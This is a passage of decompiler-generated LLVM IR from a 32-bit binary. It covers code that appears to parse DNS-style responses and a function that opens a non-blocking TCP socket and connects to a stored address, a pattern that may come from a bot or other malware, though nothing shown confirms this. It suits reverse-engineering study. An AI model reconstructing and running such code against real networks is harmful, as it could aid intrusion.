  %v6_804f6b625 = or i32 %v3_804f6b622, %v5_804f6b624
  store i32 %v6_804f6b625, i32* %eax.global-to-local, align 4
  %v4_804f6b826 = icmp eq i8 %v2_804f6b621, 0
  br i1 %v4_804f6b826, label %dec_label_pc_804f6e9, label %dec_label_pc_804f6bc.preheader.preheader

dec_label_pc_804f6bc.preheader.preheader:         ; preds = %dec_label_pc_804f6ad
  %v1_804f6dd = add i32 %v0_804f652127, 32
  br label %dec_label_pc_804f6bc.preheader

dec_label_pc_804f6bc.preheader:                   ; preds = %dec_label_pc_804f6bc.preheader.preheader, %dec_label_pc_804f738
  %v0_804f73c = phi i32 [ %v3_804f73c, %dec_label_pc_804f738 ], [ 1, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f73962 = phi i32 [ %v0_804f739, %dec_label_pc_804f738 ], [ 0, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f6c558 = phi i32 [ %v1_804f738, %dec_label_pc_804f738 ], [ %v1_804f6a4, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f6bc56 = phi i32 [ %v6_804f6b6, %dec_label_pc_804f738 ], [ %v6_804f6b625, %dec_label_pc_804f6bc.preheader.preheader ]
  br label %dec_label_pc_804f6bc

dec_label_pc_804f6bc:                             ; preds = %dec_label_pc_804f6bc.preheader, %dec_label_pc_804f6c0
  %v0_804f739 = phi i32 [ %v0_804f73962, %dec_label_pc_804f6bc.preheader ], [ 1, %dec_label_pc_804f6c0 ]
  %v0_804f738 = phi i32 [ %v0_804f6c558, %dec_label_pc_804f6bc.preheader ], [ %v2_804f6e1, %dec_label_pc_804f6c0 ]
  %v4_804f6b6 = phi i32 [ %v0_804f6bc56, %dec_label_pc_804f6bc.preheader ], [ %v6_804f6e3, %dec_label_pc_804f6c0 ]
  %v1_804f6bc = trunc i32 %v4_804f6b6 to i8
  %tmp140 = icmp ult i8 %v1_804f6bc, -64
  br i1 %tmp140, label %dec_label_pc_804f738, label %dec_label_pc_804f6c0

dec_label_pc_804f6c0:                             ; preds = %dec_label_pc_804f6bc
  %v1_804f6c0 = urem i32 %v4_804f6b6, 256
  store i32 %v1_804f6c0, i32* %eax.global-to-local, align 4
  %v1_804f6c5 = add i32 %v0_804f738, 1
  %v2_804f6c5 = inttoptr i32 %v1_804f6c5 to i8*
  %v3_804f6c5 = load i8, i8* %v2_804f6c5, align 1
  %v4_804f6c5 = zext i8 %v3_804f6c5 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_804f6d3 = mul nuw nsw i32 %v1_804f6c0, 256
  %v2_804f6d6 = add nsw i32 %v2_804f6d3, -49152
  %v3_804f6d6 = or i32 %v4_804f6c5, %v2_804f6d6
  store i32 %v3_804f6d6, i32* %eax.global-to-local, align 4
  %v2_804f6e1 = add i32 %v1_804f6dd, %v3_804f6d6
  store i32 %v2_804f6e1, i32* %edx.global-to-local, align 4
  %v1_804f6e3 = inttoptr i32 %v2_804f6e1 to i8*
  %v2_804f6e3 = load i8, i8* %v1_804f6e3, align 1
  %v3_804f6e3 = zext i8 %v2_804f6e3 to i32
  %v6_804f6e3 = or i32 %v3_804f6e3, %v2_804f6d6
  store i32 %v6_804f6e3, i32* %eax.global-to-local, align 4
  %v4_804f6e5 = icmp eq i8 %v2_804f6e3, 0
  %v1_804f6e7 = icmp eq i1 %v4_804f6e5, false
  br i1 %v1_804f6e7, label %dec_label_pc_804f6bc, label %dec_label_pc_804f6e9

dec_label_pc_804f6e9:                             ; preds = %dec_label_pc_804f738, %dec_label_pc_804f6c0, %dec_label_pc_804f6ad
  %v1_804f6e9 = phi i32 [ 0, %dec_label_pc_804f6ad ], [ 1, %dec_label_pc_804f6c0 ], [ %v0_804f739, %dec_label_pc_804f738 ]
  %v0_804f6e9 = phi i32 [ 1, %dec_label_pc_804f6ad ], [ %v0_804f73c, %dec_label_pc_804f6c0 ], [ %v3_804f73c, %dec_label_pc_804f738 ]
  %v2_804f6e9 = add i32 %v0_804f6e9, %v1_804f6e9
  store i32 %v2_804f6e9, i32* @ebx, align 4
  %v2_804f6eb = add i32 %v2_804f6e9, %v1_804f6a4
  br label %dec_label_pc_804f64d.backedge

dec_label_pc_804f64d.backedge:                    ; preds = %dec_label_pc_804f6e9, %dec_label_pc_804f760
  %v0_804f64d = phi i32 [ %v0_804f652127, %dec_label_pc_804f6e9 ], [ %v0_804f64d.pre, %dec_label_pc_804f760 ]
  %storemerge = phi i32 [ %v2_804f6eb, %dec_label_pc_804f6e9 ], [ %v2_804f76b, %dec_label_pc_804f760 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804f64d = add i32 %v0_804f64d, 22
  %v2_804f64d = inttoptr i32 %v1_804f64d to i16*
  %v3_804f64d = load i16, i16* %v2_804f64d, align 2
  %v4_804f64d = add i16 %v3_804f64d, -1
  store i16 %v4_804f64d, i16* %v2_804f64d, align 2
  %v0_804f652 = load i32, i32* @esp, align 4
  %v1_804f652 = add i32 %v0_804f652, 22
  %v2_804f652 = inttoptr i32 %v1_804f652 to i16*
  %v3_804f652 = load i16, i16* %v2_804f652, align 2
  %v13_804f652 = icmp eq i16 %v3_804f652, -1
  br i1 %v13_804f652, label %dec_label_pc_804f5e4, label %dec_label_pc_804f65a

dec_label_pc_804f6f3:                             ; preds = %dec_label_pc_804f5e4
  %v1_804f6f3 = add i32 %v2_804f5f0, 4
  %v2_804f6f3 = inttoptr i32 %v1_804f6f3 to i32*
  %v3_804f6f3 = load i32, i32* %v2_804f6f3, align 4
  store i32 %v3_804f6f3, i32* %eax.global-to-local, align 4
  %v1_804f6f6 = icmp eq i32 %v3_804f6f3, 0
  br i1 %v1_804f6f6, label %dec_label_pc_804f706, label %dec_label_pc_804f6fa

dec_label_pc_804f6fa:                             ; preds = %dec_label_pc_804f6f3
  %v3_804f6fd = inttoptr i32 %v0_804f5ed to i32*
  store i32 %v3_804f6f3, i32* %v3_804f6fd, align 4
  %v1_804f6fe = call i32 @function_8053999(i32 1)
  store i32 %v1_804f6fe, i32* %eax.global-to-local, align 4
  %v0_804f703 = load i32, i32* @esp, align 4
  %v1_804f703 = add i32 %v0_804f703, 16
  br label %dec_label_pc_804f706

dec_label_pc_804f706:                             ; preds = %dec_label_pc_804f6f3, %dec_label_pc_804f6fa
  %v0_804f706 = phi i32 [ %v1_804f5ed, %dec_label_pc_804f6f3 ], [ %v1_804f703, %dec_label_pc_804f6fa ]
  %v2_804f709 = inttoptr i32 %v0_804f706 to i32*
  %v3_804f709 = load i32, i32* %v2_804f709, align 4
  store i32 %v3_804f709, i32* @esi, align 4
  %v2_804f70d = add i32 %v0_804f706, -16
  %v3_804f70d = inttoptr i32 %v2_804f70d to i32*
  store i32 %v3_804f709, i32* %v3_804f70d, align 4
  %v1_804f70e = call i32 @function_8053999(i32 1)
  store i32 %v1_804f70e, i32* %eax.global-to-local, align 4
  %v0_804f713 = load i32, i32* @esp, align 4
  %v1_804f713 = add i32 %v0_804f713, 16
  %v2_804f713 = inttoptr i32 %v1_804f713 to i32*
  store i32 0, i32* %v2_804f713, align 4
  %v0_804f71b = load i32, i32* @esp, align 4
  %v1_804f71b = add i32 %v0_804f71b, 16
  %v1_804f71e = inttoptr i32 %v1_804f71b to i32*
  %v2_804f71e = load i32, i32* %v1_804f71e, align 4
  store i32 %v2_804f71e, i32* %eax.global-to-local, align 4
  %v1_804f721 = add i32 %v0_804f71b, 4300
  %v1_804f727 = inttoptr i32 %v1_804f721 to i32*
  %v2_804f727 = load i32, i32* %v1_804f727, align 4
  store i32 %v2_804f727, i32* @ebx, align 4
  %v3_804f728 = add i32 %v0_804f71b, 4308
  %v1_804f729 = inttoptr i32 %v3_804f728 to i32*
  %v2_804f729 = load i32, i32* %v1_804f729, align 4
  store i32 %v2_804f729, i32* @edi, align 4
  %v3_804f729 = add i32 %v0_804f71b, 4312
  %v1_804f72a = inttoptr i32 %v3_804f729 to i32*
  %v2_804f72a = load i32, i32* %v1_804f72a, align 4
  store i32 %v2_804f72a, i32* @ebp, align 4
  ret i32 %v2_804f71e

dec_label_pc_804f72c:                             ; preds = %dec_label_pc_804f669
  %v1_804f72c = add i32 %v0_804f72c, 1
  store i32 %v1_804f72c, i32* %edx.global-to-local, align 4
  %v5_804f72d = icmp eq i32 %v0_804f72d, 0
  %v2_804f730 = zext i1 %v5_804f72d to i32
  %v3_804f730 = add i32 %v2_804f730, %v0_804f730
  %v1_804f663 = inttoptr i32 %v1_804f72c to i8*
  %v2_804f663 = load i8, i8* %v1_804f663, align 1
  %v3_804f663 = zext i8 %v2_804f663 to i32
  %v5_804f663 = and i32 %v4_804f663, -256
  %v6_804f663 = or i32 %v3_804f663, %v5_804f663
  store i32 %v6_804f663, i32* %eax.global-to-local, align 4
  %v4_804f665 = icmp eq i8 %v2_804f663, 0
  br i1 %v4_804f665, label %dec_label_pc_804f69a, label %dec_label_pc_804f669.preheader

dec_label_pc_804f738:                             ; preds = %dec_label_pc_804f6bc
  %v1_804f738 = add i32 %v0_804f738, 1
  store i32 %v1_804f738, i32* %edx.global-to-local, align 4
  %v5_804f739 = icmp eq i32 %v0_804f739, 0
  %v2_804f73c = zext i1 %v5_804f739 to i32
  %v3_804f73c = add i32 %v2_804f73c, %v0_804f73c
  %v1_804f6b6 = inttoptr i32 %v1_804f738 to i8*
  %v2_804f6b6 = load i8, i8* %v1_804f6b6, align 1
  %v3_804f6b6 = zext i8 %v2_804f6b6 to i32
  %v5_804f6b6 = and i32 %v4_804f6b6, -256
  %v6_804f6b6 = or i32 %v3_804f6b6, %v5_804f6b6
  store i32 %v6_804f6b6, i32* %eax.global-to-local, align 4
  %v4_804f6b8 = icmp eq i8 %v2_804f6b6, 0
  br i1 %v4_804f6b8, label %dec_label_pc_804f6e9, label %dec_label_pc_804f6bc.preheader

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f69a
  %v1_804f744 = add i32 %v2_804f69c, 2
  %v2_804f744 = inttoptr i32 %v1_804f744 to i16*
  %v3_804f744 = load i16, i16* %v2_804f744, align 2
  %v9_804f744 = icmp eq i16 %v3_804f744, 256
  %v1_804f74a = icmp eq i1 %v9_804f744, false
  br i1 %v1_804f74a, label %dec_label_pc_804f6ad, label %dec_label_pc_804f750

dec_label_pc_804f750:                             ; preds = %dec_label_pc_804f744
  %v1_804f750 = add i32 %v2_804f69c, 8
  %v2_804f750 = inttoptr i32 %v1_804f750 to i16*
  %v3_804f750 = load i16, i16* %v2_804f750, align 2
  %v4_804f750 = zext i16 %v3_804f750 to i32
  %v6_804f750 = and i32 %v5_804f750, -65536
  %v7_804f750 = or i32 %v4_804f750, %v6_804f750
  store i32 %v7_804f750, i32* %edx.global-to-local, align 4
  %v2_804f756 = call i16 @llvm.bswap.i16(i16 %v3_804f750)
  %v3_804f756 = zext i16 %v2_804f756 to i32
  %v6_804f756 = or i32 %v3_804f756, %v6_804f750
  store i32 %v6_804f756, i32* %eax.global-to-local, align 4
  %v10_804f75a = icmp eq i16 %v3_804f750, 1024
  br i1 %v10_804f75a, label %dec_label_pc_804f773, label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f750, %dec_label_pc_804f773
  %v0_804f64d.pre = phi i32 [ %v0_804f652127, %dec_label_pc_804f750 ], [ %v0_804f64d.pre.pre, %dec_label_pc_804f773 ]
  %v0_804f76b = phi i32 [ %v1_804f6a4, %dec_label_pc_804f750 ], [ %v0_804f76b.pre, %dec_label_pc_804f773 ]
  %v0_804f760 = phi i32 [ %v7_804f750, %dec_label_pc_804f750 ], [ %v7_804f7d7, %dec_label_pc_804f773 ]
  %v1_804f760 = trunc i32 %v0_804f760 to i16
  %v2_804f760 = call i16 @llvm.bswap.i16(i16 %v1_804f760)
  %v3_804f760 = zext i16 %v2_804f760 to i32
  %v5_804f760 = and i32 %v0_804f760, -65536
  %v6_804f760 = or i32 %v3_804f760, %v5_804f760
  store i32 %v6_804f760, i32* %edx.global-to-local, align 4
  store i32 %v3_804f760, i32* %eax.global-to-local, align 4
  %v2_804f76b = add i32 %v3_804f760, %v0_804f76b
  br label %dec_label_pc_804f64d.backedge

dec_label_pc_804f773:                             ; preds = %dec_label_pc_804f750
  %v2_804f773 = inttoptr i32 %v1_804f6a4 to i8*
  %v3_804f773 = load i8, i8* %v2_804f773, align 1
  %v4_804f773 = zext i8 %v3_804f773 to i32
  %v6_804f773 = and i32 %v6_804f756, -256
  %v7_804f773 = or i32 %v4_804f773, %v6_804f773
  store i32 %v7_804f773, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804f778 = add i32 %v0_804f652127, 4280
  %v4_804f778 = inttoptr i32 %v3_804f778 to i8*
  store i8 %v3_804f773, i8* %v4_804f778, align 1
  %v0_804f77f = load i32, i32* @edi, align 4
  %v1_804f77f = add i32 %v0_804f77f, 1
  %v2_804f77f = inttoptr i32 %v1_804f77f to i8*
  %v3_804f77f = load i8, i8* %v2_804f77f, align 1
  %v4_804f77f = zext i8 %v3_804f77f to i32
  %v5_804f77f = load i32, i32* %eax.global-to-local, align 4
  %v6_804f77f = and i32 %v5_804f77f, -256
  %v7_804f77f = or i32 %v6_804f77f, %v4_804f77f
  store i32 %v7_804f77f, i32* %eax.global-to-local, align 4
  %v2_804f782 = load i32, i32* @esp, align 4
  %v3_804f782 = add i32 %v2_804f782, 4281
  %v4_804f782 = inttoptr i32 %v3_804f782 to i8*
  store i8 %v3_804f77f, i8* %v4_804f782, align 1
  %v0_804f789 = load i32, i32* @edi, align 4
  %v1_804f789 = add i32 %v0_804f789, 2
  %v2_804f789 = inttoptr i32 %v1_804f789 to i8*
  %v3_804f789 = load i8, i8* %v2_804f789, align 1
  %v4_804f789 = zext i8 %v3_804f789 to i32
  %v5_804f789 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f789 = and i32 %v5_804f789, -256
  %v7_804f789 = or i32 %v6_804f789, %v4_804f789
  store i32 %v7_804f789, i32* %eax.global-to-local, align 4
  %v2_804f78c = load i32, i32* @esp, align 4
  %v3_804f78c = add i32 %v2_804f78c, 4282
  %v4_804f78c = inttoptr i32 %v3_804f78c to i8*
  store i8 %v3_804f789, i8* %v4_804f78c, align 1
  %v0_804f793 = load i32, i32* @edi, align 4
  %v1_804f793 = add i32 %v0_804f793, 3
  %v2_804f793 = inttoptr i32 %v1_804f793 to i8*
  %v3_804f793 = load i8, i8* %v2_804f793, align 1
  %v4_804f793 = zext i8 %v3_804f793 to i32
  %v5_804f793 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f793 = and i32 %v5_804f793, -256
  %v7_804f793 = or i32 %v6_804f793, %v4_804f793
  store i32 %v7_804f793, i32* %eax.global-to-local, align 4
  %v2_804f796 = load i32, i32* @esp, align 4
  %v3_804f796 = add i32 %v2_804f796, 4283
  %v4_804f796 = inttoptr i32 %v3_804f796 to i8*
  store i8 %v3_804f793, i8* %v4_804f796, align 1
  %v0_804f79d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f79d = load i32, i32* @esp, align 4
  %v2_804f79d = add i32 %v1_804f79d, -4
  %v3_804f79d = inttoptr i32 %v2_804f79d to i32*
  store i32 %v0_804f79d, i32* %v3_804f79d, align 4
  %v0_804f79e = load i32, i32* %eax.global-to-local, align 4
  %v2_804f79e = add i32 %v1_804f79d, -8
  %v3_804f79e = inttoptr i32 %v2_804f79e to i32*
  store i32 %v0_804f79e, i32* %v3_804f79e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804f7a1 = inttoptr i32 %v1_804f79d to i32*
  %v3_804f7a1 = load i32, i32* %v2_804f7a1, align 4
  store i32 %v3_804f7a1, i32* @edx, align 4
  %v1_804f7a5 = inttoptr i32 %v3_804f7a1 to i8*
  %v2_804f7a5 = load i8, i8* %v1_804f7a5, align 1
  %v3_804f7a5 = zext i8 %v2_804f7a5 to i32
  %v1_804f7a7 = mul nuw nsw i32 %v3_804f7a5, 4
  %v2_804f7a7 = add nuw nsw i32 %v1_804f7a7, 4
  store i32 %v2_804f7a7, i32* %eax.global-to-local, align 4
  %v2_804f7ae = add i32 %v1_804f79d, -12
  %v3_804f7ae = inttoptr i32 %v2_804f7ae to i32*
  store i32 %v2_804f7a7, i32* %v3_804f7ae, align 4
  %v0_804f7af = load i32, i32* @edx, align 4
  %v1_804f7af = add i32 %v0_804f7af, 4
  %v2_804f7af = inttoptr i32 %v1_804f7af to i32*
  %v3_804f7af = load i32, i32* %v2_804f7af, align 4
  store i32 %v3_804f7af, i32* %eax.global-to-local, align 4
  %v2_804f7b2 = add i32 %v1_804f79d, -16
  %v3_804f7b2 = inttoptr i32 %v2_804f7b2 to i32*
  store i32 %v3_804f7af, i32* %v3_804f7b2, align 4
  %v0_804f7b3 = call i32 @function_805343c()
  store i32 %v0_804f7b3, i32* %eax.global-to-local, align 4
  %v0_804f7b8 = load i32, i32* @esp, align 4
  %v1_804f7b8 = add i32 %v0_804f7b8, 16
  %v2_804f7b8 = inttoptr i32 %v1_804f7b8 to i32*
  %v3_804f7b8 = load i32, i32* %v2_804f7b8, align 4
  store i32 %v3_804f7b8, i32* %ecx.global-to-local, align 4
  %v1_804f7bc = inttoptr i32 %v3_804f7b8 to i8*
  %v2_804f7bc = load i8, i8* %v1_804f7bc, align 1
  %v3_804f7bc = zext i8 %v2_804f7bc to i32
  %v4_804f7bc = load i32, i32* @edx, align 4
  %v5_804f7bc = and i32 %v4_804f7bc, -256
  %v6_804f7bc = or i32 %v5_804f7bc, %v3_804f7bc
  store i32 %v6_804f7bc, i32* %edx.global-to-local, align 4
  %v2_804f7be = add i32 %v3_804f7b8, 4
  %v3_804f7be = inttoptr i32 %v2_804f7be to i32*
  store i32 %v0_804f7b3, i32* %v3_804f7be, align 4
  %v0_804f7c1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7c1 = urem i32 %v0_804f7c1, 256
  %v2_804f7c1 = load i32, i32* @ebx, align 4
  %v3_804f7c1 = and i32 %v2_804f7c1, -256
  %v4_804f7c1 = or i32 %v3_804f7c1, %v1_804f7c1
  store i32 %v4_804f7c1, i32* @ebx, align 4
  %v0_804f7c3 = load i32, i32* @esp, align 4
  %v1_804f7c3 = add i32 %v0_804f7c3, 4296
  %v2_804f7c3 = inttoptr i32 %v1_804f7c3 to i32*
  %v3_804f7c3 = load i32, i32* %v2_804f7c3, align 4
  store i32 %v3_804f7c3, i32* %ecx.global-to-local, align 4
  %v1_804f7ca = add i32 %v0_804f7c1, 1
  store i32 %v1_804f7ca, i32* %edx.global-to-local, align 4
  %v3_804f7cb = mul i32 %v4_804f7c1, 4
  %v4_804f7cb = add i32 %v3_804f7cb, %v0_804f7b3
  %v5_804f7cb = inttoptr i32 %v4_804f7cb to i32*
  store i32 %v3_804f7c3, i32* %v5_804f7cb, align 4
  %v0_804f7ce = load i32, i32* @esp, align 4
  %v1_804f7ce = add i32 %v0_804f7ce, 16
  %v2_804f7ce = inttoptr i32 %v1_804f7ce to i32*
  %v3_804f7ce = load i32, i32* %v2_804f7ce, align 4
  store i32 %v3_804f7ce, i32* %eax.global-to-local, align 4
  %v0_804f7d5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7d5 = trunc i32 %v0_804f7d5 to i8
  %v3_804f7d5 = inttoptr i32 %v3_804f7ce to i8*
  store i8 %v1_804f7d5, i8* %v3_804f7d5, align 1
  %v0_804f7d7 = load i32, i32* @esi, align 4
  %v1_804f7d7 = add i32 %v0_804f7d7, 8
  %v2_804f7d7 = inttoptr i32 %v1_804f7d7 to i16*
  %v3_804f7d7 = load i16, i16* %v2_804f7d7, align 2
  %v4_804f7d7 = zext i16 %v3_804f7d7 to i32
  %v5_804f7d7 = load i32, i32* %edx.global-to-local, align 4
  %v6_804f7d7 = and i32 %v5_804f7d7, -65536
  %v7_804f7d7 = or i32 %v6_804f7d7, %v4_804f7d7
  store i32 %v7_804f7d7, i32* %edx.global-to-local, align 4
  %v0_804f76b.pre = load i32, i32* @edi, align 4
  %v0_804f64d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f760

; uselistorder directives
  uselistorder i32 %v7_804f7d7, { 1, 0 }
  uselistorder i32 %v0_804f7c1, { 1, 0 }
  uselistorder i32 %v3_804f760, { 0, 2, 1 }
  uselistorder i32 %v0_804f760, { 1, 0 }
  uselistorder i32 %v6_804f6b6, { 1, 0 }
  uselistorder i32 %v3_804f73c, { 1, 0 }
  uselistorder i32 %v1_804f738, { 1, 2, 0 }
  uselistorder i32 %v6_804f663, { 2, 1, 0 }
  uselistorder i32 %v3_804f730, { 1, 0 }
  uselistorder i32 %v1_804f72c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804f706, { 1, 0 }
  uselistorder i32 %v0_804f652, { 2, 1, 0 }
  uselistorder i32 %v6_804f6e3, { 1, 0 }
  uselistorder i32 %v2_804f6e1, { 1, 2, 0 }
  uselistorder i32 %v3_804f6d6, { 1, 0 }
  uselistorder i32 %v4_804f6b6, { 1, 0, 2 }
  uselistorder i32 %v0_804f739, { 2, 0, 1 }
  uselistorder i32 %v0_804f73c, { 1, 0 }
  uselistorder i32 %v1_804f6a4, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_804f694, { 0, 2, 1 }
  uselistorder i32 %v2_804f692, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804f687, { 1, 0 }
  uselistorder i32 %v4_804f663, { 1, 0, 2 }
  uselistorder i32 %v0_804f72d, { 2, 0, 1 }
  uselistorder i32 %v0_804f730, { 1, 0 }
  uselistorder i32 %v6_804f66316, { 1, 0, 2 }
  uselistorder i32 %v0_804f65a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804f652127, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804f652122, { 0, 2, 1 }
  uselistorder i32 %v1_804f623, { 1, 0 }
  uselistorder i32 %v0_804f61f, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804f61a, { 1, 0, 2 }
  uselistorder i32 %v0_804f5ed, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_804f5ae, { 1, 0 }
  uselistorder i32 %v0_804f55f, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v0_804f55a, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f527, { 1, 0 }
  uselistorder i32 %v2_804f524, { 1, 0 }
  uselistorder i32 %v0_804f520, { 1, 0 }
  uselistorder i32 %v1_804f50d, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804f501, { 1, 0 }
  uselistorder i32 %v0_804f4fe, { 2, 0, 1 }
  uselistorder i32 %v0_804f4e9, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804f4c7, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804f4a8, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v3_804f4a3, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f488, { 1, 0 }
  uselistorder i32 %v2_804f40f, { 1, 0 }
  uselistorder i32 %v1_804f401, { 1, 0 }
  uselistorder i32 %v1_804f3a3, { 1, 0 }
  uselistorder i8 %v2_804f392, { 2, 0, 3, 1 }
  uselistorder i32 %v0_804f38c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804f360, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 27, 16, 17, 18, 19, 20, 21, 22, 60, 24, 25, 26, 58, 59, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder i32 (i32)* @function_8053df0, { 6, 0, 2, 5, 4, 3, 1 }
  uselistorder i32 (i8*)* @function_8051ca0, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 21, 22, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 70, 0, 71, 72, 73 }
  uselistorder label %dec_label_pc_804f760, { 1, 0 }
  uselistorder label %dec_label_pc_804f706, { 1, 0 }
  uselistorder label %dec_label_pc_804f64d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804f6bc, { 1, 0 }
  uselistorder label %dec_label_pc_804f6bc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f669, { 1, 0 }
  uselistorder label %dec_label_pc_804f669.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f65a, { 1, 0 }
  uselistorder label %dec_label_pc_804f5e4, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804f49c, { 1, 0 }
  uselistorder label %dec_label_pc_804f392, { 1, 0 }
}

define i32 @function_804f800() local_unnamed_addr {
dec_label_pc_804f800:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804f800 = load i32, i32* @ebx, align 4
  %v0_804f801 = load i32, i32* @eax, align 4
  store i32 %v0_804f801, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804f826 = add i32 %v0_804f801, 4
  %v2_804f826 = inttoptr i32 %v1_804f826 to i32*
  %v3_804f826 = load i32, i32* %v2_804f826, align 4
  %v10_804f829 = icmp eq i32 %v3_804f826, -1
  br i1 %v10_804f829, label %dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge, label %dec_label_pc_804f82e

dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge: ; preds = %dec_label_pc_804f800
  br label %dec_label_pc_804f83a

dec_label_pc_804f82e:                             ; preds = %dec_label_pc_804f800
  %v1_804f832 = call i32 @function_8052241(i32 %v3_804f826)
  br label %dec_label_pc_804f83a

dec_label_pc_804f83a:                             ; preds = %dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge, %dec_label_pc_804f82e
  %v3_804f841 = call i32 @function_8052a35(i32 2, i32 1, i32 0)
  %v1_804f849 = load i32, i32* @ebx, align 4
  %v2_804f849 = add i32 %v1_804f849, 4
  %v3_804f849 = inttoptr i32 %v2_804f849 to i32*
  store i32 %v3_804f841, i32* %v3_804f849, align 4
  %v8_804f84c = icmp eq i32 %v3_804f841, -1
  br i1 %v8_804f84c, label %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge, label %dec_label_pc_804f84f

dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge: ; preds = %dec_label_pc_804f83a
  br label %dec_label_pc_804f8c3

dec_label_pc_804f84f:                             ; preds = %dec_label_pc_804f83a
  %v0_804f851 = load i32, i32* @ebx, align 4
  %v1_804f851 = add i32 %v0_804f851, 28
  store i32 %v1_804f851, i32* @eax, align 4
  %v1_804f859 = add i32 %v0_804f851, 24
  %v2_804f859 = inttoptr i32 %v1_804f859 to i32*
  store i32 0, i32* %v2_804f859, align 4
  %v0_804f860 = load i32, i32* @eax, align 4
  %v2_804f861 = call i32 @function_8051d30(i32 %v0_804f860, i32 256)
  %v0_804f869 = load i32, i32* @ebx, align 4
  %v1_804f869 = add i32 %v0_804f869, 4
  %v2_804f869 = inttoptr i32 %v1_804f869 to i32*
  %v3_804f869 = load i32, i32* %v2_804f869, align 4
  %v3_804f871 = call i32 @function_805217d(i32 %v3_804f869, i32 3, i32 0)
  %v0_804f879 = load i32, i32* @ebx, align 4
  %v1_804f879 = add i32 %v0_804f879, 4
  %v2_804f879 = inttoptr i32 %v1_804f879 to i32*
  %v3_804f879 = load i32, i32* %v2_804f879, align 4
  %v12_804f87c = or i32 %v3_804f871, 2048
  %v3_804f883 = call i32 @function_805217d(i32 %v3_804f879, i32 4, i32 %v12_804f87c)
  %v0_804f888 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804f89e = load i32, i32* @global_var_8056990.34, align 16
  %v2_804f8a3 = add i32 %v0_804f888, 8
  %v3_804f8a3 = inttoptr i32 %v2_804f8a3 to i32*
  store i32 %v0_804f89e, i32* %v3_804f8a3, align 4
  %v2_804f8a6 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804f8ad = load i32, i32* @ebx, align 4
  %v1_804f8ad = add i32 %v0_804f8ad, 4
  %v2_804f8ad = inttoptr i32 %v1_804f8ad to i32*
  %v3_804f8ad = load i32, i32* %v2_804f8ad, align 4
  store i32 %v3_804f8ad, i32* %edx.global-to-local, align 4
  %v1_804f8b0 = add i32 %v0_804f8ad, 12
  %v2_804f8b0 = inttoptr i32 %v1_804f8b0 to i32*
  store i32 1, i32* %v2_804f8b0, align 4
  %v0_804f8ba = load i32, i32* %edx.global-to-local, align 4
  %v3_804f8bb = call i32 @function_805285a(i32 %v0_804f8ba, i32 %v2_804f8a6, i32 16)
  br label %dec_label_pc_804f8c3

dec_label_pc_804f8c3:                             ; preds = %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge, %dec_label_pc_804f84f
